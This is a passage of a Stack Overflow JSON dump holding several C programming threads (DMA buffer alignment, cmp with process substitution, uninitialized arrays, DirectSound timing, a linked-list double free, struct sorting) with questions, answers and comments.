(src_off &gt;&gt; align) &lt;&lt; align;\ndst_off = (dst_off &gt;&gt; align) &lt;&lt; align;\n</code></pre>\n\n<p>It looks like that original address is totally random from dmatest_random(). Not sure what can be said/what guarentees can be made about that memory.</p>\n\n<pre><code>static unsigned long dmatest_random(void)\n{\n    unsigned long buf;\n\n    get_random_bytes(&amp;buf, sizeof(buf));\n    return buf;\n}\n</code></pre>\n\n<p>They then use these offsets to set up their source and destination buffers for DMA.</p>\n\n<pre><code>u8 *buf = thread-&gt;srcs[i] + src_off;\n\ndma_srcs[i] = dma_map_single(tx_dev-&gt;dev, buf, len, DMA_MEM_TO_DEV);\n</code></pre>\n\n<p>I am very confused as to what this does. My only guess is that it will page align the beginning of the source and destination buffers in virtual memory.</p>\n\n<p>Looking at the way I set up my buffers with kmalloc and kzalloc, do I have any guarantee that my buffers start at page boundaries? Am I right in that I need my buffers to start at page boundaries?</p>\n\n<p>The source code to the Xilinx DMA test driver is here: <a href=\"https://github.com/Xilinx/linux-xlnx/blob/master/drivers/dma/xilinx/axidmatest.c\" rel=\"nofollow noreferrer\">https://github.com/Xilinx/linux-xlnx/blob/master/drivers/dma/xilinx/axidmatest.c</a></p>\n\n<p>You can find the high level description of the problem I am trying to solve here: <a href=\"https://forums.xilinx.com/t5/Embedded-Linux/AXI-DMA-Drivers-for-Kernel-v-4-9-PetaLinux-2017-3/td-p/828917\" rel=\"nofollow noreferrer\">https://forums.xilinx.com/t5/Embedded-Linux/AXI-DMA-Drivers-for-Kernel-v-4-9-PetaLinux-2017-3/td-p/828917</a></p>\n"}, {"tags": ["c", "bash", "command-line-interface", "mips"], "answers": [{"tags": [], "owner": {"reputation": 16493, "user_id": 2164109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3Ot5P.jpg?s=128&g=1", "display_name": "morgano", "link": "https://stackoverflow.com/users/2164109/morgano"}, "is_accepted": false, "score": 1, "last_activity_date": 1518035440, "creation_date": 1518035440, "answer_id": 48672729, "question_id": 48672593, "link": "https://stackoverflow.com/questions/48672593/using-cmp-with-process-substitution-stdout-bash/48672729#48672729", "title": "Using cmp with process substitution (stdout)? (Bash)", "body": "<p>I'm not sure about using the format <code>cmp file1 file2</code>, but you can do <code>file1 | cmp file2</code> like this:</p>\n\n<p><code>bin/mips -d test.bin | cmp test.asm</code></p>\n"}, {"comments": [{"owner": {"reputation": 309, "user_id": 5837840, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tXoyA.jpg?s=128&g=1", "display_name": "Hid", "link": "https://stackoverflow.com/users/5837840/hid"}, "edited": false, "score": 0, "creation_date": 1518036097, "post_id": 48672774, "comment_id": 84344052, "body": "This worked for me! However, I am curious what the difference is between your answer and the one below by @morgano? I tried both and both gave me the same line number and byte number where the two outputs differed."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 309, "user_id": 5837840, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tXoyA.jpg?s=128&g=1", "display_name": "Hid", "link": "https://stackoverflow.com/users/5837840/hid"}, "edited": false, "score": 1, "creation_date": 1518036131, "post_id": 48672774, "comment_id": 84344069, "body": "His takes advantage of the fact that <code>cmp</code> will read from standard input if either of the filenames is missing or <code>-</code>. Mine uses a shell feature to emulate a file with using process substitution. Just different ways to achieve the same result."}], "tags": [], "owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "is_accepted": true, "score": 3, "last_activity_date": 1518035634, "creation_date": 1518035634, "answer_id": 48672774, "question_id": 48672593, "link": "https://stackoverflow.com/questions/48672593/using-cmp-with-process-substitution-stdout-bash/48672774#48672774", "title": "Using cmp with process substitution (stdout)? (Bash)", "body": "<p>That command should work, but there's no need to use process substitution with <code>cat</code>, just put the filename there:</p>\n\n<pre><code>cmp test.asm &lt;(bin/mips -d &lt; test.bin)\n</code></pre>\n"}], "owner": {"reputation": 309, "user_id": 5837840, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tXoyA.jpg?s=128&g=1", "display_name": "Hid", "link": "https://stackoverflow.com/users/5837840/hid"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 262, "favorite_count": 0, "accepted_answer_id": 48672774, "answer_count": 2, "score": 0, "last_activity_date": 1518035634, "creation_date": 1518034869, "question_id": 48672593, "link": "https://stackoverflow.com/questions/48672593/using-cmp-with-process-substitution-stdout-bash", "title": "Using cmp with process substitution (stdout)? (Bash)", "body": "<p>For our class, we had to make a C program that encodes MIPS instructions into instruction words and also decodes instruction words into MIPS instructions.</p>\n\n<p>I wrote everything already and tested on some cases, but I wanted to test it on a bigger dataset.</p>\n\n<p>We are given the test files: <code>test.asm</code> and <code>test.bin</code>.\nThe <code>.asm</code> file has MIPS instructions and the <code>.bin</code> file has the equivalent instruction words for those MIPS instructions.</p>\n\n<p>My <code>decode</code> function takes in the instruction words from <code>test.bin</code>, converts them to equivalent MIPS instructions and sends it to <code>stdout</code>.</p>\n\n<p>I want to compare the output from my decode function with the MIPS instructions in the <code>test.asm</code> file to see that they are equivalent (that I decoded correctly).</p>\n\n<p>I was told that I could use the <code>cmp</code> command with process substitution to compare the two but I don't know what I would put inside the <code>&lt;(...)</code>.</p>\n\n<p>I run my program using: <code>bin/mips -d &lt; test.bin</code> where the <code>-d</code> flag represents <code>decoding</code>.</p>\n\n<p>I was thinking maybe it would be like this, but I'm not sure:</p>\n\n<p><code>cmp &lt;(cat test.asm) &lt;(bin/mips -d &lt; test.bin)</code></p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 360, "user_id": 5875805, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/S4zBy.jpg?s=128&g=1", "display_name": "Tormund Giantsbane", "link": "https://stackoverflow.com/users/5875805/tormund-giantsbane"}, "edited": false, "score": 0, "creation_date": 1518034845, "post_id": 48672532, "comment_id": 84343375, "body": "That is the way uninitialized arrays work in C, yes."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1518035027, "post_id": 48672532, "comment_id": 84343479, "body": "&quot; I have an array that I am populating at positions 0, 1, 2, 3, 4, 5 with a basic for loop.&quot; --&gt; &quot; I have an array that I am <b>partially</b> populating (assigning) ...&quot;"}, {"owner": {"reputation": 1101, "user_id": 7021836, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/299fc62810116e741333419b8e6cfd24?s=128&d=identicon&r=PG&f=1", "display_name": "Alex Quilliam", "link": "https://stackoverflow.com/users/7021836/alex-quilliam"}, "edited": false, "score": 0, "creation_date": 1518035070, "post_id": 48672532, "comment_id": 84343499, "body": "You are declaring the first array but not initializing it."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 3, "creation_date": 1518035099, "post_id": 48672532, "comment_id": 84343521, "body": "&quot;it prints out weird values in positions that I never intended to touch (positions 6 - 13).&quot;  Why did code then touch them by reading them?"}, {"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 2, "creation_date": 1518039961, "post_id": 48672532, "comment_id": 84345971, "body": "There&#39;s no such thing as an &quot;empty&quot; variable. Once you declare it, it always has <i>something</i> in it. Either what you put there, or whatever was left over in memory from some other process."}], "answers": [{"comments": [{"owner": {"reputation": 5010, "user_id": 3150445, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7bfca2588483eadf6695a120cbcef1f8?s=128&d=identicon&r=PG&f=1", "display_name": "jwdonahue", "link": "https://stackoverflow.com/users/3150445/jwdonahue"}, "edited": false, "score": 0, "creation_date": 1518036417, "post_id": 48672633, "comment_id": 84344203, "body": "It is not the program &quot;that is free to do anything it wants&quot;.  It is the compiler tool chain that is free to generate code that may or may not initialize those elements of the array."}], "tags": [], "owner": {"reputation": 679, "user_id": 5155574, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FX9BZpOiVdk/AAAAAAAAAAI/AAAAAAAAAI0/cHgtmpGWfgM/photo.jpg?sz=128", "display_name": "Josh Abraham", "link": "https://stackoverflow.com/users/5155574/josh-abraham"}, "is_accepted": false, "score": -1, "last_activity_date": 1518035024, "creation_date": 1518035024, "answer_id": 48672633, "question_id": 48672532, "link": "https://stackoverflow.com/questions/48672532/c-populating-array-without-being-asked-to/48672633#48672633", "title": "C populating array without being asked to", "body": "<blockquote>\n  <p>Note: array1 is the problem. array2 is just another tester, that seems to work correctly. Is this just the way memory works in C? Why do the last 2 values in array1 go back to being '0's then?!</p>\n</blockquote>\n\n<p>This is undefined behavior and your program is free to do anything it wants.</p>\n"}, {"comments": [{"owner": {"reputation": 2449, "user_id": 500276, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/200bf76976f24add540182f5c3a42788?s=128&d=identicon&r=PG&f=1", "display_name": "Mark Benningfield", "link": "https://stackoverflow.com/users/500276/mark-benningfield"}, "edited": false, "score": 1, "creation_date": 1518035903, "post_id": 48672704, "comment_id": 84343933, "body": "OP asked why <i>array1</i> has trailing zeros, not <i>array2</i>"}], "tags": [], "owner": {"reputation": 255, "user_id": 5287366, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/91e39d2c1363ae9a1c73bd84805564af?s=128&d=identicon&r=PG&f=1", "display_name": "JD.", "link": "https://stackoverflow.com/users/5287366/jd"}, "is_accepted": false, "score": -1, "last_activity_date": 1518035706, "last_edit_date": 1518035706, "creation_date": 1518035348, "answer_id": 48672704, "question_id": 48672532, "link": "https://stackoverflow.com/questions/48672532/c-populating-array-without-being-asked-to/48672704#48672704", "title": "C populating array without being asked to", "body": "<p><a href=\"http://www.coding-guidelines.com/C99/html/6.7.8.html\" rel=\"nofollow noreferrer\">C99 Section 6.7.8 Initializers </a></p>\n\n<blockquote>\n  <p><strong>1671</strong> If there are fewer initializers in a brace-enclosed list than\n  there are elements or members of an aggregate, or fewer characters in\n  a string literal used to initialize an array of known size than there\n  are elements in the array, the remainder of the aggregate shall be\n  initialized implicitly the same as objects that have static storage\n  duration.</p>\n</blockquote>\n\n<p>And <code>static int</code> is <strong>0</strong> as default. That's why <code>array2</code> has trailing <strong>0</strong>'s.</p>\n"}, {"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518036262, "post_id": 48672759, "comment_id": 84344130, "body": "UV for <i>indeterminate</i>: &quot;either an unspecified value or a trap representation&quot;."}, {"owner": {"reputation": 5010, "user_id": 3150445, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7bfca2588483eadf6695a120cbcef1f8?s=128&d=identicon&r=PG&f=1", "display_name": "jwdonahue", "link": "https://stackoverflow.com/users/3150445/jwdonahue"}, "edited": false, "score": 0, "creation_date": 1518036898, "post_id": 48672759, "comment_id": 84344442, "body": "You might add that zero is just as likely to turn up in uninitialized memory as any other value."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 8, "last_activity_date": 1518048476, "last_edit_date": 1518048476, "creation_date": 1518035576, "answer_id": 48672759, "question_id": 48672532, "link": "https://stackoverflow.com/questions/48672532/c-populating-array-without-being-asked-to/48672759#48672759", "title": "C populating array without being asked to", "body": "<p><code>array</code> hasn't been initialized, and is not defined at file scope, so its values are indeterminate.  You later <em>assign</em> values to certain elements of the array, however this is not the same as initializing.  </p>\n\n<p>When you then print the full array, those indeterminate values get printed.  As to why some of those values are 0, as all unassigned values are indeterminate, 0 is as good a value as any other.  Note also that an indeterminate value could be a trap representation, which means that it is not a valid representation for that datatype.  If you attempt to read a trap representation, you invoke undefined behavior.</p>\n\n<p>In contrast, <code>array2</code> <em>is</em> initialized.  You give values for the first 6 elements of the array, and the rest are initialized to 0.</p>\n"}], "owner": {"reputation": 100, "user_id": 9296944, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/da72733c2ff2dfc58793ad6fe5917387?s=128&d=identicon&r=PG&f=1", "display_name": "King Arthur the Third", "link": "https://stackoverflow.com/users/9296944/king-arthur-the-third"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 74, "favorite_count": 0, "accepted_answer_id": 48672759, "answer_count": 3, "score": 1, "last_activity_date": 1518048476, "creation_date": 1518034666, "last_edit_date": 1518048256, "question_id": 48672532, "link": "https://stackoverflow.com/questions/48672532/c-populating-array-without-being-asked-to", "title": "C populating array without being asked to", "body": "<p>I'm playing around in C with some basics. I have an array that I am populating at positions 0, 1, 2, 3, 4, 5 with a basic for loop. The problem is: when I try to print it out, it prints out weird values in positions that I never intended to touch (positions 6 - 13).</p>\n\n<p>The code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#define MAXSIZE 16\n\nint main()\n{\n  int array[MAXSIZE];\n  int array2[MAXSIZE] = {0, 1, 2, 3, 4, 5};\n\n  int i;\n\n  for(i = 0; i &lt; 6; i++)\n  {\n        array[i] = i;\n  }\n\n  for( i = 0; i &lt; sizeof(array) / sizeof(int); i++)\n  //for( i = 0; i &lt; 10; i++ )\n  {\n        printf(\"%d\", array[i]);\n  }\n\n  printf(\"\\n\");\n\n  for(i = 0; i &lt; sizeof(array2) / sizeof(int); i++)\n  {\n        printf(\"%d\", array2[i]);\n  }\n\n // printf(\"%lf\\n\", array[2]);\n\n  return 0;\n}\n</code></pre>\n\n<p><strong>OUTPUT:</strong></p>\n\n<p>0 1 2 3 4 5 822123896 32766 810140152 32643 816205824 32643 816288200 32643 0 0</p>\n\n<p>0 1 2 3 4 5 0 0 0 0 0 0 0 0 0 0</p>\n\n<p>Note: <code>array</code> is the problem. <code>array2</code> is just another tester that seems to work correctly. Is this just the way memory works in C? <em>Why do the last 2 values in <code>array</code> go back to being '0's then?!</em></p>\n"}, {"tags": ["c", "winapi", "directsound"], "comments": [{"owner": {"reputation": 81087, "user_id": 104458, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/cc46b8a10ecb92e61aaeb1efe436a0c8?s=128&d=identicon&r=PG", "display_name": "selbie", "link": "https://stackoverflow.com/users/104458/selbie"}, "edited": false, "score": 0, "creation_date": 1518160322, "post_id": 48672396, "comment_id": 84399440, "body": "Make your DSound buffer several seconds long.  DSound just wasn&#39;t meant for micro-sized buffers."}, {"owner": {"reputation": 28528, "user_id": 3780494, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/vqia1.jpg?s=128&g=1", "display_name": "Chuck Walbourn", "link": "https://stackoverflow.com/users/3780494/chuck-walbourn"}, "edited": false, "score": 0, "creation_date": 1518396677, "post_id": 48672396, "comment_id": 84475882, "body": "It&#39;s also emulated on all modern versions of Windows which is why it&#39;s deprecated. If you want todo something like this, consider using WASAPI directly"}], "owner": {"reputation": 13, "user_id": 8499757, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eoDDr.jpg?s=128&g=1", "display_name": "l0w-sec", "link": "https://stackoverflow.com/users/8499757/l0w-sec"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 55, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1518034036, "creation_date": 1518034036, "question_id": 48672396, "link": "https://stackoverflow.com/questions/48672396/sound-synchronization-error-using-directsound", "title": "Sound synchronization error using DirectSound", "body": "<p>I'm using directsound to play a sine wave. The idea is simple : I have an application running at 30fps, and I create a buffer worth of 1/30sec sound each frame, to be played in the next frame.</p>\n\n<p>The way I'm doing it :\nI first get the dsound play cursor, and compute the offset and the bytes to write out of it.</p>\n\n<pre><code>static void win32_update_soundbuffer(SoundBuffer *source, WIN32SOUNDBUFFER *output) {\nfree(source-&gt;data);\n\n\nuint32_t play_cursor;\nuint32_t write_cursor;\noutput-&gt;handle-&gt;GetCurrentPosition((LPDWORD)&amp;play_cursor, (LPDWORD)&amp;write_cursor);\n\nstatic uint32_t last_play_cursor = -1;\nbool play_cursor_moved = last_play_cursor == play_cursor ? false : true;\n\noutput-&gt;offset = (output-&gt;sample_index * output-&gt;sample_size) % output-&gt;buffer_size;\n\nuint32_t bytes_to_write = 0;\nif (output-&gt;offset == play_cursor) {\n    if (play_cursor_moved) {\n        bytes_to_write = output-&gt;buffer_size;\n    }\n}\nelse if (output-&gt;offset &lt; play_cursor) { bytes_to_write = play_cursor - output-&gt;offset; }\nelse if (output-&gt;offset &gt; play_cursor) { bytes_to_write = output-&gt;buffer_size - (output-&gt;offset - play_cursor); }\n\nlast_play_cursor = play_cursor;\n\nsource-&gt;sample_count = bytes_to_write / output-&gt;sample_size;\nsource-&gt;data = (uint16_t *)malloc(bytes_to_write);  //TODO: maybe we don't want to use malloc\n}\n</code></pre>\n\n<p>Then I lock the buffer and write the sine wave into it.</p>\n\n<pre><code>static void win32_fill_soundbuffer(SoundBuffer *source, WIN32SOUNDBUFFER *output) {\n\n//get the buffer location to write sounds to\noutput-&gt;handle-&gt;Lock(output-&gt;offset, source-&gt;sample_count * output-&gt;sample_size, &amp;output-&gt;region1, &amp;output-&gt;region1_size,\n    &amp;output-&gt;region2, &amp;output-&gt;region2_size, NULL);\n\nuint16_t *source_sample = source-&gt;data;\nuint16_t *out_sample = (uint16_t *)output-&gt;region1;\nuint32_t sample_count1 = output-&gt;region1_size / output-&gt;sample_size;\nfor (uint32_t i = 0; i &lt; sample_count1; i++) {\n    *out_sample++ = *source_sample++;\n    *out_sample++ = *source_sample++;\n    output-&gt;sample_index++;\n}\n\nout_sample = (uint16_t *)output-&gt;region2;\nuint32_t sample_count2 = output-&gt;region2_size / output-&gt;sample_size;\nfor (uint32_t i = 0; i &lt; sample_count2; i++) {\n    *out_sample++ = *source_sample++;\n    *out_sample++ = *source_sample++;\n    output-&gt;sample_index++;\n}\n\noutput-&gt;handle-&gt;Unlock(output-&gt;region1, output-&gt;region1_size, output-&gt;region2, output-&gt;region2_size);\n}\n</code></pre>\n\n<p>(the source buffer is something I first send to the \"user\" to be filled with the sine wave, and then retrieve to fill the real sound buffer. I'm doing it because the project is multi-platform).</p>\n\n<p>The implementation look like that : </p>\n\n<pre><code>WIN32SOUNDBUFFER win_soundbuffer = ...\nSoundBuffer soundbuffer = ...\n\nwhile(running) {\n    win32_update_soundbuffer(&amp;soundbuffer, &amp;win_soundbuffer);\n    user_process_sound(&amp;soundbuffer);\n    win32_fill_soundbuffer(&amp;soundbuffer, &amp;win_soundbuffer);\n    win_soundbuffer.handle-&gt;Play(NULL, NULL, DSBPLAY_LOOPING);\n}\n</code></pre>\n\n<p>The errors I'm experiencing : it does only work for some buffer size (1s to 1/8s, no problem. 1/9s is scratching a lot. 1/10s, 1/20s are ok too.) The weirder thing is that it also for 1/40s, which should be impossible since the buffer isn't large enough to last for a frame.\nWhen debugging, I can see that the play cursor isn't moving fast enough, and sometimes it stay at the same place for a few frames, which could be the reason for the scratching.\nDoes anyone know how to solve that ? Thanks for the help.</p>\n"}, {"tags": ["c", "linked-list", "nodes"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1518034195, "post_id": 48672382, "comment_id": 84343025, "body": "Now is the perfect time to <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">learn how to debug your program</a>. Also, when it comes to linked lists, it often helps using pen and paper to draw a few different lists and attempt to do the list-operations on paper."}], "answers": [{"tags": [], "owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "is_accepted": false, "score": 1, "last_activity_date": 1518035020, "last_edit_date": 1518035020, "creation_date": 1518034119, "answer_id": 48672418, "question_id": 48672382, "link": "https://stackoverflow.com/questions/48672382/infinite-loop-when-i-remove-a-node/48672418#48672418", "title": "Infinite loop when I remove a node", "body": "<p>one big issue:</p>\n\n<pre><code>    temp = list-&gt;next-&gt;next;\n    free(list-&gt;next-&gt;next);\n    free(list-&gt;next);\n    list-&gt;next = temp;\n    free(temp);\n</code></pre>\n\n<p>temp points to list->next->next, you already called <code>free</code> on it. Double free on the same location is undefined behaviour. Anything can happen.</p>\n\n<p>Even with 1 free it fails because you're assigned a freed location (<code>temp</code>) as <code>list-&gt;next</code></p>\n\n<p>I believe you want to remove &amp; free one element. That code should suffice:</p>\n\n<pre><code>temp = list-&gt;next-&gt;next;\nfree(list-&gt;next);\nlist-&gt;next = temp;\n</code></pre>\n\n<p>It saves <code>list-&gt;next-&gt;next</code> in <code>temp</code> (because after <code>list-&gt;next</code> is <code>free</code>d, it's not legal to traverse it anymore), then it assigns it to the now freed <code>list-&gt;next</code>: you just shortened your linked list without memory leak and without undefined behaviour.</p>\n\n<p>The last case (removing the last element) is also a problem. You should memorize the before-last element to set <code>next</code> to <code>NULL</code></p>\n\n<p>Then when doing this:</p>\n\n<pre><code>    free(list);\n    list-&gt;next = NULL;\n</code></pre>\n\n<p><code>list-&gt;next</code> sets the next element to the deleted one to <code>NULL</code>: illegal &amp; you're freeing the wrong element. You mean:</p>\n\n<pre><code>free(list-&gt;next);\nlist-&gt;next = NULL;\n</code></pre>\n"}], "owner": {"reputation": 19, "user_id": 7783261, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/1584778654870502/picture?type=large", "display_name": "Jersey Fonseca", "link": "https://stackoverflow.com/users/7783261/jersey-fonseca"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 158, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1518035020, "creation_date": 1518033962, "question_id": 48672382, "link": "https://stackoverflow.com/questions/48672382/infinite-loop-when-i-remove-a-node", "title": "Infinite loop when I remove a node", "body": "<p>I am getting an infinite loop when I remove a node.</p>\n\n<p>Here is where the node is being removed:</p>\n\n<pre><code>llist *modify_sorted_total(gymnast_info *ginfo, llist *head) {\n\n    llist *accu = head;\n    int pos = 0;\n\n    while (accu) {\n        if (strcasecmp(ginfo-&gt;lastname, accu-&gt;g-&gt;lastname) == 0 &amp;&amp;\n            strcasecmp(ginfo-&gt;firstname, accu-&gt;g-&gt;firstname) == 0) {\n            remove_node(accu, pos);\n            add_sorted_total(ginfo, head);\n            return head;\n        }\n        pos++;\n        accu = accu-&gt;next;\n    }\n    return NULL;\n}\n</code></pre>\n\n<p>Here is my remove node function:</p>\n\n<pre><code>void remove_node(llist *head, int pos) {\n    int i;\n    llist* list = head;\n    for (i = 0 ; i &lt; pos ; i++)\n        list = list-&gt;next;\n\n    llist *temp = list;\n    if (pos == 0) {\n        head = temp-&gt;next;\n        free(temp);\n        return;\n    } else if (pos &gt; 0 &amp;&amp; list-&gt;next) {\n        temp = list-&gt;next-&gt;next;\n        free(list-&gt;next-&gt;next);\n        free(list-&gt;next);\n        list-&gt;next = temp;\n        free(temp);\n        return;\n    } else if (pos &gt; 0 &amp;&amp; !list-&gt;next) {\n        list = head;\n        for (i = 0 ; i &lt; pos - 1 ; i++)\n            list = list-&gt;next;\n        free(list);\n        list-&gt;next = NULL;\n        return;\n    }\n}\n</code></pre>\n\n<p>So this is how I have been running my tests. The list is created, which certainly works.:</p>\n\n<pre><code>fprintf(stdout, \"\\nEyeball tests starting!\\n\\nTesting create_gymnast:\\n\\n\");\n    float test_scores1[NUM_EVENTS] = {8.7, 8.5, 8.4, 8.2};\n    float test_scores2[NUM_EVENTS] = {5.2, 5.7, 5.4, 5.6};\n    float test_scores3[NUM_EVENTS] = {3.8, 3.7, 3.6, 3.7};\n    //float test_scores4[NUM_EVENTS] = {1.5, 1.3, 1.4, 1.4};                                                 \n\n    gymnast_info *adam = create_gymnast(\"Adam\",\n                                \"Fonseca\", USA, test_scores1);\n\n    gymnast_info *jersey = create_gymnast(\"Jersey\",\n                                \"Fonseca\", USA, test_scores2);\n\n    gymnast_info *joshua = create_gymnast(\"Joshua\",\n                               \"ZZZ\", CHINA, test_scores3);\n\n    gymnast_info *zach = create_gymnast(\"Zachary\",\n                               \"middle\", MEXICO, test_scores3);\n\nllist *test3 = (llist *)malloc(sizeof(llist));\n    test3-&gt;g = joshua;\n    test3-&gt;next = NULL;\n\n    fprintf(stdout, \"Jersey should be added to the end:\\n\\n\");\n    print_list(add_sorted_total(jersey, test3), stdout);\n    fprintf(stdout, \"\\nZachary should be added to the middle:\\n\\n\");\n    print_list(add_sorted_total(zach, test3), stdout);\n    fprintf(stdout, \"\\nAdam should be added to the end:\\n\\n\");\n    print_list(add_sorted_total(adam, test3), stdout);\n\nprint_list(modify_sorted_total(joshua, test3), stdout);\n</code></pre>\n\n<p>Joshua is being printed out infinitely. When I try to ctrl-c in gdb, it says it's at \"??.\" Anyone have any idea what's going on?</p>\n"}, {"tags": ["c", "struct"], "answers": [{"comments": [{"owner": {"reputation": 2791, "user_id": 1960266, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/5iP9l.jpg?s=128&g=1", "display_name": "Little", "link": "https://stackoverflow.com/users/1960266/little"}, "edited": false, "score": 0, "creation_date": 1518035018, "post_id": 48672332, "comment_id": 84343475, "body": "I have made the fixes 2 and 3, but stills the unexpected behaviour comes out, what is wrong? thanks"}, {"owner": {"reputation": 2791, "user_id": 1960266, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/5iP9l.jpg?s=128&g=1", "display_name": "Little", "link": "https://stackoverflow.com/users/1960266/little"}, "edited": false, "score": 0, "creation_date": 1518035467, "post_id": 48672332, "comment_id": 84343717, "body": "now it works, thank you, I would try to fix number 1"}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": true, "score": 2, "last_activity_date": 1518033726, "creation_date": 1518033726, "answer_id": 48672332, "question_id": 48672267, "link": "https://stackoverflow.com/questions/48672267/issue-when-ordering-an-array-of-structs-in-c/48672332#48672332", "title": "issue when ordering an array of structs in C", "body": "<p>You have quite a few problems:</p>\n\n<p>First of all you leak memory, since you allocate memory and make <code>name</code> point to that, then you make <code>name</code> point somewhere else. You need to <em>copy</em>into the memory you allocate.</p>\n\n<p>Secondly, also with the <code>name</code> member, once you copy into the memory, you will go out of bounds since you only allocate five bytes for each string, but you have strings of up to at least nine characters (ten with the terminator).</p>\n\n<p>Thirdly, and more about going out of bounds, your <code>class</code> array only have three elements, yet you access four elements of the array.</p>\n\n<p>The reassignment of the <code>name</code> pointer won't cause more problems than a temporary memory leak, since you don't attempt to pass the pointer to <code>free</code>. The second problem isn't really an issue because you don't copy the strings <em>yet</em>. The third problem on the other hand, that will lead to <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\"><em>undefined behavior</em></a> as soon as you execute that code.</p>\n"}], "owner": {"reputation": 2791, "user_id": 1960266, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/5iP9l.jpg?s=128&g=1", "display_name": "Little", "link": "https://stackoverflow.com/users/1960266/little"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "accepted_answer_id": 48672332, "answer_count": 1, "score": 0, "last_activity_date": 1518034969, "creation_date": 1518033458, "last_edit_date": 1518034969, "question_id": 48672267, "link": "https://stackoverflow.com/questions/48672267/issue-when-ordering-an-array-of-structs-in-c", "title": "issue when ordering an array of structs in C", "body": "<p>I want to order an array of structs by the first letter of a student\u00b4s name. The code that I made so far is the following:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct{\n    int cod;\n    char* name;\n    int mark;\n}student;\n\nvoid print(student* class){\n     int i;\n     for (i=0;i&lt;4;i++){\n         printf(\"%d\\n\",class[i].cod);\n         printf(\"%s\\n\",class[i].name);\n         